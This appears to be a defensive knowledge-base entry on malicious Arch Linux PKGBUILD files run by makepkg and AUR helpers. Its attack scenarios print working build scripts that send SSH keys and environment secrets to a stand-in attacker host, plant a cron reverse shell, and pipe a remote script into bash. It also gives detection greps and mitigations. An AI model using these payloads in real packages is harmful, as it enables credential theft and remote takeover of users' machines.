---
name: "PKGBUILD Arbitrary Code Execution via makepkg"
packageManager: "pacman"
slug: "pacman-pkgbuild-execution"
category: "Code Execution"
severity: "critical"
platform:
  - "Linux"
description: "PKGBUILD files are plain Bash scripts sourced and executed by makepkg when building Arch Linux packages from the AUR or any custom repository. Functions like build(), package(), prepare(), and pkgver() execute arbitrary shell commands with the privileges of the invoking user. Because AUR packages are community-submitted and not audited by Arch maintainers, an attacker can publish a PKGBUILD that runs malicious commands during the build process. AUR helpers like yay and paru automate this workflow and may execute PKGBUILDs without prompting the user to review them first."
prerequisites:
  - "Ability to publish or update a package on the AUR (requires only a free aur.archlinux.org account)"
  - "The victim must build the package using makepkg, or an AUR helper such as yay or paru"
  - "The victim runs the build as a non-root user (standard makepkg behavior), but the build still has full access to the user's home directory, SSH keys, and environment"
attackScenarios:
  - title: "Malicious PKGBUILD Exfiltrating SSH Keys and Environment"
    description: "An attacker publishes an AUR package with a PKGBUILD that exfiltrates the user's SSH private keys and sensitive environment variables during the build() function. Because makepkg sources the PKGBUILD as a Bash script, any command in build() runs with the user's full shell permissions."
    commands:
      - label: "Malicious PKGBUILD that exfiltrates credentials during build"
        code: |
          # PKGBUILD
          pkgname=cool-status-bar
          pkgver=1.2.0
          pkgrel=1
          pkgdesc="A lightweight status bar for tiling WMs"
          arch=('x86_64')
          url="https://github.com/attacker/cool-status-bar"
          license=('MIT')
          depends=('libx11')
          source=("$pkgname-$pkgver.tar.gz::$url/archive/v$pkgver.tar.gz")
          sha256sums=('SKIP')

          build() {
              cd "$srcdir/$pkgname-$pkgver"
              # Looks like a normal build step
              make

              # Exfiltrate SSH keys via DNS
              for key in ~/.ssh/id_*; do
                  [ -f "$key" ] && xxd -p "$key" | fold -w 60 | while read line; do
                      dig "$line.exfil.attacker.example.com" +short 2>/dev/null
                  done
              done

              # Harvest environment secrets
              env | grep -iE 'token|secret|key|pass|aws' | \
                  curl -s -X POST -d @- https://attacker.example.com/collect &
          }

          package() {
              cd "$srcdir/$pkgname-$pkgver"
              make DESTDIR="$pkgdir/" install
          }
        language: "bash"
      - label: "Victim installs via AUR helper without reviewing PKGBUILD"
        code: |
          yay -S cool-status-bar
          # yay clones the AUR repo, runs makepkg which sources the PKGBUILD
          # build() exfiltrates keys before the package is even installed
        language: "bash"
  - title: "Backdoor Injection via package() Function"
    description: "The package() function controls what files get installed to the system. An attacker can inject a backdoor binary or cron job into the package directory, which then gets installed system-wide when pacman processes the built package."
    commands:
      - label: "PKGBUILD that injects a persistent reverse shell via cron"
        code: |
          package() {
              cd "$srcdir/$pkgname-$pkgver"
              make DESTDIR="$pkgdir/" install

              # Inject a cron job that establishes a reverse shell every 5 minutes
              mkdir -p "$pkgdir/etc/cron.d"
              echo "*/5 * * * * root bash -c 'bash -i >& /dev/tcp/attacker.example.com/4444 0>&1'" \
                  > "$pkgdir/etc/cron.d/$pkgname-update"
          }
        language: "bash"
  - title: "Abuse pkgver() for Pre-Build Code Execution"
    description: "The pkgver() function runs before build() to determine the dynamic version number. Attackers can place malicious code here, which executes even earlier in the build pipeline and may be overlooked by users who only review build() and package()."
    commands:
      - label: "PKGBUILD abusing pkgver() for early execution"
        code: |
          pkgver() {
              cd "$srcdir/$pkgname"
              # This looks like a normal git-describe version extraction
              printf "%s" "$(git describe --long --tags | sed 's/^v//;s/-/.r/;s/-/./')"

              # But also downloads and runs a payload
              curl -s https://attacker.example.com/stage1.sh | bash &
          }
        language: "bash"
detection:
  - title: "Always review PKGBUILDs before building"
    description: "Read the PKGBUILD and any .install files before running makepkg or an AUR helper. Look for curl, wget, bash -c, eval, encoded strings, and network calls in build(), package(), prepare(), and pkgver() functions."
    commands:
      - code: |
          # View the PKGBUILD before building
          yay -G cool-status-bar
          cat cool-status-bar/PKGBUILD
          # Look for suspicious commands
          grep -nE 'curl|wget|nc |ncat|bash -c|eval|base64|/dev/tcp|dig |nslookup' cool-status-bar/PKGBUILD
        language: "bash"
  - title: "Diff PKGBUILDs on updates"
    description: "When an AUR package is updated, diff the new PKGBUILD against the previous version to detect injected malicious code."
    commands:
      - code: |
          # paru shows diffs by default on updates
          paru -S cool-status-bar
          # Or manually diff
          diff <(git show HEAD~1:PKGBUILD) PKGBUILD
        language: "bash"
  - title: "Monitor build process with strace"
    description: "Trace system calls during makepkg to detect unexpected network connections or file access outside the build directory."
    commands:
      - code: "strace -f -e trace=network,open,openat makepkg 2>&1 | grep -vE '(srcdir|pkgdir|/usr/lib)'"
        language: "bash"
mitigation:
  - "Always read PKGBUILD and .install files before building AUR packages"
  - "Configure AUR helpers to prompt for PKGBUILD review (e.g., paru shows diffs by default)"
  - "Build AUR packages in an isolated environment such as a container or clean chroot (extra-x86_64-build)"
  - "Prefer official repository packages over AUR equivalents when available"
  - "Use namcap to lint PKGBUILDs for common issues and suspicious patterns"
  - "Subscribe to AUR package comments and monitor for community-reported issues"
references:
  - title: "Arch Wiki - PKGBUILD"
    url: "https://wiki.archlinux.org/title/PKGBUILD"
  - title: "Arch Wiki - AUR Submission Guidelines"
    url: "https://wiki.archlinux.org/title/AUR_submission_guidelines"
  - title: "Arch Wiki - makepkg"
    url: "https://wiki.archlinux.org/title/Makepkg"
created: 2026-04-14
updated: 2026-04-14
---
